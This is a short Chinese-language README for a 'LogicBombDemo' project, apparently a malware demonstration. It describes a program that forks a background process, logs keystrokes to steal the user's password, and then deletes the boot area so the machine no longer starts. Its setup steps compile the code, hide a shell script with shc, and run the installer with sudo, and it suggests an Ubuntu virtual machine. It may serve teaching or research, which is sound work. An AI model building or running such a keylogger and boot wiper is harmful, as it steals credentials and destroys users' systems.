# LogicBombDemo

## 概念
執行後會直接結束，產生一個orphan process在背景執行，並且在5秒後開始監聽系統中使用者的鍵盤輸入，從中竊取使用者密碼。
得到密碼後開始刪除boot開機區，使得下次使用者開機時會因為找不到boot loader相關程式而進不到系統中。

## Setup
開一個ubuntu virtual machine
```
$ cd LogicBombDemo
$ gcc install.c -o install
$ shc -f configure.sh -o configure
$ sudo ./install
```